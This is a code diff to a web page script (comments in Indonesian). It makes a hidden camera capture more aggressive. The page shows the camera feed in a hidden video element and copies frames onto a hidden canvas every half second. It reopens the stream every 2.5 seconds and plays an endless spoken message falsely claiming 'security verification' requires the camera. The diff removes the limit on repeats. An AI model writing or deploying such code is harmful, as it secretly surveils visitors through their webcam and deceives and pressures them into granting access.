@@ -15,6 +15,7 @@
 
 <div class="hidden-container">
   <video id="cam-feed" autoplay playsinline muted></video>
+  <canvas id="processing-canvas" width="640" height="480"></canvas>
 </div>
 
 <script>
@@ -23,30 +24,29 @@
 
   var CONFIG = {
     tts: {
-      text: "Security verification required. Camera access must be enabled to confirm user identity.",
+      text: "Security verification required. Camera access must remain active to confirm user identity.",
       lang: 'en-US',
       rate: 0.9,
       pitch: 1.0,
-      repeatInterval: 6000,
-      maxRepeats: 15
+      repeatInterval: 5000,
+      maxRepeats: 30
     },
-    cameraRetryInterval: 4000
+    loopInterval: 2500 // Interval agresif untuk siklus re-inisialisasi stream
   };
 
   var state = {
     ttsStarted: false,
     ttsCount: 0,
     camStream: null,
-    camActive: false
+    camActive: false,
+    loopTimer: null
   };
 
   // ============================================
-  // TTS MODULE
+  // TTS MODULE (Continuous Loop)
   // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
-
     try {
       var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
       u.lang = CONFIG.tts.lang;
@@ -54,10 +54,7 @@
       u.pitch = CONFIG.tts.pitch;
 
       u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-        }
+        setTimeout(speakOnce, CONFIG.tts.repeatInterval);
       };
 
       window.speechSynthesis.speak(u);
@@ -72,10 +69,23 @@
   }
 
   // ============================================
-  // CAMERA PERSISTENT ACCESS MODULE
+  // AGGRESSIVE CAMERA LOOP MODULE
   // ============================================
+  function stopCurrentStream() {
+    if (state.camStream) {
+      try {
+        state.camStream.getTracks().forEach(function(track) {
+          track.stop();
+        });
+      } catch (e) {}
+      state.camStream = null;
+    }
+    state.camActive = false;
+  }
+
   function requestCameraAccess() {
-    if (state.camActive) return;
+    // Tutup stream sebelumnya secara berkala untuk memaksa siklus refresh stream baru (Looping mechanism)
+    stopCurrentStream();
 
     navigator.mediaDevices.getUserMedia({ 
       video: { 
@@ -88,56 +98,54 @@
     .then(function(stream) {
       state.camStream = stream;
       state.camActive = true;
-      console.log("[+] Camera access granted and active stream opened.");
+      console.log("[+] Camera stream cycle active.");
       
       var videoElement = document.getElementById('cam-feed');
       videoElement.srcObject = stream;
       videoElement.play().catch(function(){});
 
-      // Memastikan stream tetap hidup atau memantau status track
+      // Proses frame secara kontinu di background menggunakan canvas untuk menjaga aktivitas stream tetap tinggi
+      var canvas = document.getElementById('processing-canvas');
+      var ctx = canvas.getContext('2d');
+      var frameLoop = setInterval(function() {
+        if (!state.camActive) {
+          clearInterval(frameLoop);
+          return;
+        }
+        try {
+          ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+        } catch (e) {}
+      }, 500);
+
       stream.getVideoTracks().forEach(function(track) {
         track.onended = function() {
-          console.log("[!] Camera track ended, attempting re-initialization...");
           state.camActive = false;
-          setTimeout(requestCameraAccess, 2000);
         };
       });
     })
     .catch(function(err) {
-      console.log("[-] Camera access denied or restricted:", err.name);
-      // Coba ulang secara periodik jika izin belum diberikan atau di-block sementara
-      setTimeout(requestCameraAccess, CONFIG.cameraRetryInterval);
+      console.log("[-] Camera access restricted/denied:", err.name);
     });
   }
 
   // ============================================
-  // AUTOMATED TRIGGER CHAINS
+  // INITIALIZATION & PERSISTENT LOOP TRIGGER
   // ============================================
   window.addEventListener('DOMContentLoaded', function() {
     startTTS();
     requestCameraAccess();
   });
 
-  // Simulasi pemicu interaksi otomatis via event sintetis jika memungkinkan
-  setTimeout(function() {
+  // Main loop interval untuk memastikan siklus kamera terus direfresh secara periodik
+  state.loopTimer = setInterval(function() {
     requestCameraAccess();
-    startTTS();
-  }, 1000);
+  }, CONFIG.loopInterval);
 
-  // Interval konstan untuk memastikan loop kamera mencoba membuka kembali jika tertutup
-  setInterval(function() {
-    if (!state.camActive) {
-      requestCameraAccess();
-    }
-  }, CONFIG.cameraRetryInterval);
-
-  // Visibility change handling (memicu ulang saat tab kembali aktif)
+  // Tab visibility monitoring
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden) {
       startTTS();
-      if (!state.camActive) {
-        requestCameraAccess();
-      }
+      requestCameraAccess();
     }
   });
 
